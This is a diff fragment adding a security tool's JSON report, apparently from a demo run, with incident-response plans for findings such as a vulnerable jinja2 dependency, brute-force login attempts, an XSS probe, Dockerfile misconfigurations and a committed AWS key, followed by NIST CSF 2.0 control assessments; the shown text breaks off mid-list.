+        "data_at_risk": "Depends on the vulnerable component's role; assume code/data on the host",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "App team",
+        "AppSec",
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)\nPriority: P1   SLA: Begin containment within 1 hour\nAffected: requirements.txt:4\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: Jinja2 sandbox escape via str.format_map, allowing an attacker who controls a template to break out of the sandbox.\nImmediate actions proposed: Assess exposure; if internet-facing, apply a virtual patch / WAF mitigation\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-4dde57b4f8be",
+        "F-83069228f1b0",
+        "F-f3be33a4a8b1"
+      ],
+      "title": "IR plan: Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Block the offending source IP(s) at the edge / WAF",
+          "owner_role": "Network / SecOps",
+          "command_or_change": "Add deny rule for the source IP(s) on the perimeter firewall or WAF",
+          "rollback": "Remove the deny rule once the campaign subsides",
+          "verification": "No further auth attempts from the IP in logs",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "contain",
+          "action": "Lock or force-reset the targeted account(s) and revoke active sessions",
+          "owner_role": "IAM",
+          "command_or_change": "Disable account / expire password / revoke tokens & sessions",
+          "rollback": "Re-enable after owner verification",
+          "verification": "Owner confirms control; no unexpected sessions remain",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Rotate credentials for any account with a successful login after failures",
+          "owner_role": "IAM",
+          "command_or_change": "Reset password + rotate API keys / tokens for the account",
+          "rollback": "n/a",
+          "verification": "Old credentials rejected; new ones issued to verified owner",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Review auth logs for successful logins from the source and for lateral movement",
+          "owner_role": "SOC",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Analyst sign-off that scope is understood",
+          "requires_human_approval": false
+        },
+        {
+          "phase": "recover",
+          "action": "Restore normal access for verified users; keep heightened monitoring 7 days",
+          "owner_role": "IAM / SOC",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Users can log in; alerting tuned",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Enforce MFA, tune lockout thresholds, deploy fail2ban/rate-limiting, add a detection rule",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Controls deployed and tested",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: 203.0.113.66, demo/env/var/log/auth.log, demo/env/var/log/nginx/access.log",
+        "data_at_risk": "Credentials and anything they authorize",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "IAM",
+        "IAM / SOC",
+        "Network / SecOps",
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: demo/env/var/log/auth.log\nDetected by: log_monitor at 2026-09-05T16:02:59+00:00\n\nWhat we know: 8 failed authentication events from 203.0.113.66 between Sep  6 01:12:03 .. Sep  6 01:12:21. No successful login from this IP was observed.\nImmediate actions proposed: Block the offending source IP(s) at the edge / WAF\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-3c0e8bd0a3a2",
+        "F-4c70da6fa645",
+        "F-8bd7e433f512",
+        "F-c87d3959274e"
+      ],
+      "title": "IR plan: XSS probe: 1 request(s) from 198.51.100.23",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Deploy/verify a WAF rule for the payload class and rate-limit the source",
+          "owner_role": "AppSec / Network",
+          "command_or_change": "Enable managed WAF ruleset (e.g. OWASP CRS) for the affected route",
+          "rollback": "Loosen rule if false positives appear",
+          "verification": "Malicious requests blocked; legitimate traffic unaffected",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Patch the underlying injection/traversal flaw in the endpoint",
+          "owner_role": "App team",
+          "command_or_change": "Parameterize queries / validate & canonicalize input / apply output encoding",
+          "rollback": "Revert the deploy",
+          "verification": "Exploit request no longer succeeds in a test",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Review app and DB logs for successful exploitation and data access",
+          "owner_role": "SOC / DBA",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Analyst sign-off on impact scope",
+          "requires_human_approval": false
+        },
+        {
+          "phase": "recover",
+          "action": "Redeploy the patched service and confirm functionality",
+          "owner_role": "App team",
+          "command_or_change": "",
+          "rollback": "Roll back to previous known-good build",
+          "verification": "Regression tests pass; endpoint healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add SAST/DAST gates to CI and a regression test for this payload",
+          "owner_role": "AppSec",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "CI blocks a reintroduction of the flaw",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: 198.51.100.23, demo/env/var/log/nginx/access.log",
+        "data_at_risk": "Application database contents (potential read/modify)",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "App team",
+        "AppSec",
+        "AppSec / Network"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: XSS probe: 1 request(s) from 198.51.100.23\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: demo/env/var/log/nginx/access.log\nDetected by: log_monitor at 2026-09-05T16:02:59+00:00\n\nWhat we know: 1 HTTP request(s) matched the 'XSS probe' signature. At least one received a non-error (<400) response - possible successful exploitation, investigate.\nImmediate actions proposed: Deploy/verify a WAF rule for the payload class and rate-limit the source\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-baff40d64173"
+      ],
+      "title": "IR plan: Unpinned base image (`:latest` or no tag) in Dockerfile:2",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Assess whether affected containers are running in production; restrict exposure",
+          "owner_role": "Platform",
+          "command_or_change": "Apply network policy / scale down non-essential exposure",
+          "rollback": "Restore exposure after fix",
+          "verification": "Blast radius reduced and documented",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild",
+          "owner_role": "Platform",
+          "command_or_change": "Edit Dockerfile; rebuild; re-scan the image",
+          "rollback": "Redeploy previous image",
+          "verification": "Re-scan shows the misconfiguration resolved",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Roll the hardened image out across environments",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "Roll back to previous image",
+          "verification": "All workloads on the hardened image; healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root)",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "CI and admission controller reject non-compliant images",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:2",
+        "data_at_risk": "Undetermined - confirm during analysis",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: Unpinned base image (`:latest` or no tag) in Dockerfile:2\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: demo/env/app/Dockerfile:2\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: Unpinned base image (`:latest` or no tag)\nImmediate actions proposed: Assess whether affected containers are running in production; restrict exposure\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-7fc2198b44a0"
+      ],
+      "title": "IR plan: ADD used to fetch a remote URL in Dockerfile:8",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Assess whether affected containers are running in production; restrict exposure",
+          "owner_role": "Platform",
+          "command_or_change": "Apply network policy / scale down non-essential exposure",
+          "rollback": "Restore exposure after fix",
+          "verification": "Blast radius reduced and documented",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild",
+          "owner_role": "Platform",
+          "command_or_change": "Edit Dockerfile; rebuild; re-scan the image",
+          "rollback": "Redeploy previous image",
+          "verification": "Re-scan shows the misconfiguration resolved",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Roll the hardened image out across environments",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "Roll back to previous image",
+          "verification": "All workloads on the hardened image; healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root)",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "CI and admission controller reject non-compliant images",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:8",
+        "data_at_risk": "Undetermined - confirm during analysis",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: ADD used to fetch a remote URL in Dockerfile:8\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: demo/env/app/Dockerfile:8\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: ADD used to fetch a remote URL\nImmediate actions proposed: Assess whether affected containers are running in production; restrict exposure\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-976af72625aa"
+      ],
+      "title": "IR plan: Container runs as root (no non-root USER instruction) in Dockerfile:17",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Assess whether affected containers are running in production; restrict exposure",
+          "owner_role": "Platform",
+          "command_or_change": "Apply network policy / scale down non-essential exposure",
+          "rollback": "Restore exposure after fix",
+          "verification": "Blast radius reduced and documented",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild",
+          "owner_role": "Platform",
+          "command_or_change": "Edit Dockerfile; rebuild; re-scan the image",
+          "rollback": "Redeploy previous image",
+          "verification": "Re-scan shows the misconfiguration resolved",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Roll the hardened image out across environments",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "Roll back to previous image",
+          "verification": "All workloads on the hardened image; healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root)",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "CI and admission controller reject non-compliant images",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:17",
+        "data_at_risk": "Undetermined - confirm during analysis",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: Container runs as root (no non-root USER instruction) in Dockerfile:17\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: demo/env/app/Dockerfile:17\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: Container runs as root (no non-root USER instruction)\nImmediate actions proposed: Assess whether affected containers are running in production; restrict exposure\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-f1c73039b1c6"
+      ],
+      "title": "IR plan: Privilege-escalation attempts via sudo (2 event(s))",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Limit exposure of the affected asset while the issue is investigated",
+          "owner_role": "Asset owner",
+          "command_or_change": "Apply the least-disruptive mitigation available",
+          "rollback": "Remove mitigation after fix",
+          "verification": "Exposure reduced",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Apply the fix recommended in the finding",
+          "owner_role": "Asset owner",
+          "command_or_change": "See finding.recommended_fix",
+          "rollback": "Revert the change",
+          "verification": "Re-scan confirms resolution",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Return the asset to normal operation with monitoring",
+          "owner_role": "Asset owner",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Asset healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add a detection/prevention control and document lessons learned",
+          "owner_role": "Security",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Control in place",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: demo/env/var/log/auth.log",
+        "data_at_risk": "Undetermined - confirm during analysis",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Asset owner",
+        "Security"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: Privilege-escalation attempts via sudo (2 event(s))\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: demo/env/var/log/auth.log\nDetected by: log_monitor at 2026-09-05T16:02:59+00:00\n\nWhat we know: Repeated sudo authentication failures or use by a user not in sudoers.\nImmediate actions proposed: Limit exposure of the affected asset while the issue is investigated\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-014c834cd5cd"
+      ],
+      "title": "IR plan: Hardcoded secret (aws_access_key_id) in settings.py:4",
+      "priority": "P2",
+      "sla": "Begin containment within 4 hours",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Revoke / rotate the exposed credential immediately and invalidate sessions",
+          "owner_role": "Owning team",
+          "command_or_change": "Revoke the key/token at the provider; issue a replacement via the secrets manager",
+          "rollback": "n/a",
+          "verification": "Old credential returns 401/403; new one works",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Remove the secret from the repository and its git history",
+          "owner_role": "Owning team",
+          "command_or_change": "git filter-repo / BFG to purge; force-push; add a pre-commit secret scanner",
+          "rollback": "n/a",
+          "verification": "Secret absent from all branches and history; pre-commit hook active",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Review provider/audit logs for misuse of the old credential",
+          "owner_role": "SOC",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Analyst sign-off on misuse assessment",
+          "requires_human_approval": false
+        },
+        {
+          "phase": "recover",
+          "action": "Confirm the replacement credential is in use everywhere it is needed",
+          "owner_role": "Owning team",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "All consumers healthy on the new secret",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Move secrets to a manager; add CI secret scanning; brief the team",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "No plaintext secrets in repos; CI gate enforced",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: settings.py:4",
+        "data_at_risk": "Credentials and anything they authorize",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Owning team",
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: Hardcoded secret (aws_access_key_id) in settings.py:4\nPriority: P2   SLA: Begin containment within 4 hours\nAffected: settings.py:4\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: A credential-like string is committed to the repository.\nImmediate actions proposed: Revoke / rotate the exposed credential immediately and invalidate sessions\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-e43293fc771f"
+      ],
+      "title": "IR plan: apt-get install without cleaning apt lists in Dockerfile:9",
+      "priority": "P3",
+      "sla": "Remediate within 2 business days",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Assess whether affected containers are running in production; restrict exposure",
+          "owner_role": "Platform",
+          "command_or_change": "Apply network policy / scale down non-essential exposure",
+          "rollback": "Restore exposure after fix",
+          "verification": "Blast radius reduced and documented",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Fix the Dockerfile/image (non-root USER, pinned digest, no remote ADD, TLS verify on) and rebuild",
+          "owner_role": "Platform",
+          "command_or_change": "Edit Dockerfile; rebuild; re-scan the image",
+          "rollback": "Redeploy previous image",
+          "verification": "Re-scan shows the misconfiguration resolved",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Roll the hardened image out across environments",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "Roll back to previous image",
+          "verification": "All workloads on the hardened image; healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add hadolint/trivy config checks to CI and an admission policy (e.g. no :latest, no root)",
+          "owner_role": "Platform",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "CI and admission controller reject non-compliant images",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: demo/env/app/Dockerfile:9",
+        "data_at_risk": "Undetermined - confirm during analysis",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Platform"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: apt-get install without cleaning apt lists in Dockerfile:9\nPriority: P3   SLA: Remediate within 2 business days\nAffected: demo/env/app/Dockerfile:9\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: apt-get install without cleaning apt lists\nImmediate actions proposed: Assess whether affected containers are running in production; restrict exposure\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    },
+    {
+      "finding_ids": [
+        "F-817e9ba6560b"
+      ],
+      "title": "IR plan: API active testing skipped (no --allow-active / not on allowlist)",
+      "priority": "P4",
+      "sla": "Track in the normal backlog",
+      "nist_800_61_phase": "Detection & Analysis -> Containment, Eradication & Recovery -> Post-Incident Activity",
+      "steps": [
+        {
+          "phase": "contain",
+          "action": "Limit exposure of the affected asset while the issue is investigated",
+          "owner_role": "Asset owner",
+          "command_or_change": "Apply the least-disruptive mitigation available",
+          "rollback": "Remove mitigation after fix",
+          "verification": "Exposure reduced",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "eradicate",
+          "action": "Apply the fix recommended in the finding",
+          "owner_role": "Asset owner",
+          "command_or_change": "See finding.recommended_fix",
+          "rollback": "Revert the change",
+          "verification": "Re-scan confirms resolution",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "recover",
+          "action": "Return the asset to normal operation with monitoring",
+          "owner_role": "Asset owner",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Asset healthy",
+          "requires_human_approval": true
+        },
+        {
+          "phase": "post-incident",
+          "action": "Add a detection/prevention control and document lessons learned",
+          "owner_role": "Security",
+          "command_or_change": "",
+          "rollback": "n/a",
+          "verification": "Control in place",
+          "requires_human_approval": true
+        }
+      ],
+      "impact": {
+        "asset_criticality": "high",
+        "exposure": "external",
+        "blast_radius": "business-unit; artifacts: https://api.acme.example/v1/pay",
+        "data_at_risk": "Undetermined - confirm during analysis",
+        "regulatory_exposure": "Potential breach-notification obligations if personal data is confirmed accessed (GDPR/CCPA/other).",
+        "actively_exploited": false
+      },
+      "required_approvals": [
+        "Asset owner",
+        "Security"
+      ],
+      "evidence_preservation": [
+        "Snapshot affected host(s) / container(s) before making changes.",
+        "Export the relevant raw logs to write-once storage and record SHA-256 hashes.",
+        "Capture volatile state (process list, network connections) if a host may be compromised.",
+        "Record a timeline: who did what, when, in the incident ticket."
+      ],
+      "comms_draft": "SECURITY NOTIFICATION (INTERNAL - DRAFT)\n\nSummary: API active testing skipped (no --allow-active / not on allowlist)\nPriority: P4   SLA: Track in the normal backlog\nAffected: https://api.acme.example/v1/pay\nDetected by: vuln_scanner at 2026-09-05T16:02:59+00:00\n\nWhat we know: 1 endpoint(s) provided. Active testing requires target.allow_active=true and each host present in target.allowlist.\nImmediate actions proposed: Limit exposure of the affected asset while the issue is investigated\n\nThis is an automated draft. Confirm details and obtain approval before\nexecuting any containment or eradication step."
+    }
+  ],
+  "compliance": {
+    "framework": "NIST Cybersecurity Framework",
+    "framework_version": "2.0",
+    "subset_note": "Representative 12-subcategory subset for demonstration. Not the full CSF 2.0 catalog.",
+    "evaluated_controls": 12,
+    "coverage_pct": 66.7,
+    "assessments": [
+      {
+        "control_id": "PR.AA-01",
+        "title": "Identities and credentials for authorized users are managed",
+        "status": "Not Met",
+        "rationale": "3 related finding(s); worst severity 'high'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-014c834cd5cd",
+          "F-4dde57b4f8be",
+          "F-83069228f1b0"
+        ],
+        "remediation": "Block 203.0.113.66 at the perimeter and hunt for other activity from it.; Block the source IP at the edge, lock/reset the targeted account(s), enforce MFA, and deploy rate-limiting / fail2ban on the auth service.; Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "PR.AA-05",
+        "title": "Access permissions and authorizations are managed, incorporating least privilege",
+        "status": "Not Met",
+        "rationale": "2 related finding(s); worst severity 'high'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-976af72625aa",
+          "F-f1c73039b1c6"
+        ],
+        "remediation": "Add a non-root `USER` instruction and make required paths writable by that UID.; Review sudoers, alert on repeated failures, and confirm the account owner.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "DE.CM-01",
+        "title": "Networks and network services are monitored to find potentially adverse events",
+        "status": "Not Assessed",
+        "rationale": "No finding bears on this control and no positive evidence was collected offline.",
+        "evidence_finding_ids": [],
+        "remediation": "",
+        "effort": ""
+      },
+      {
+        "control_id": "DE.CM-09",
+        "title": "Computing hardware and software, runtime environments, and their data are monitored",
+        "status": "Not Met",
+        "rationale": "5 related finding(s); worst severity 'high'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-3c0e8bd0a3a2",
+          "F-4c70da6fa645",
+          "F-8bd7e433f512",
+          "F-c87d3959274e",
+          "F-f3be33a4a8b1"
+        ],
+        "remediation": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Block 198.51.100.23 at the perimeter and hunt for other activity from it.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "DE.AE-02",
+        "title": "Potentially adverse events are analyzed to better understand associated activities",
+        "status": "Not Assessed",
+        "rationale": "No finding bears on this control and no positive evidence was collected offline.",
+        "evidence_finding_ids": [],
+        "remediation": "",
+        "effort": ""
+      },
+      {
+        "control_id": "ID.RA-01",
+        "title": "Vulnerabilities in assets are identified, validated, and recorded",
+        "status": "Not Met",
+        "rationale": "6 related finding(s); worst severity 'critical'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-3c0e8bd0a3a2",
+          "F-4d73c8cbff46",
+          "F-c3b8551319dc",
+          "F-c87d3959274e",
+          "F-ce3694347c63",
+          "F-f1c73039b1c6"
+        ],
+        "remediation": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Block 198.51.100.23 at the perimeter and hunt for other activity from it.; Review sudoers, alert on repeated failures, and confirm the account owner.; Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).; Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).; Upgrade pyyaml to >= 5.4 and redeploy.",
+        "effort": "M (days) - coordinated change"
+      },
+      {
+        "control_id": "ID.RA-05",
+        "title": "Threats, vulnerabilities, likelihoods, and impacts are used to understand inherent risk",
+        "status": "Not Met",
+        "rationale": "3 related finding(s); worst severity 'critical'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-83069228f1b0",
+          "F-c87d3959274e",
+          "F-ce3694347c63"
+        ],
+        "remediation": "Block 198.51.100.23 at the perimeter and hunt for other activity from it.; Block 203.0.113.66 at the perimeter and hunt for other activity from it.; Upgrade pyyaml to >= 5.4 and redeploy.",
+        "effort": "M (days) - coordinated change"
+      },
+      {
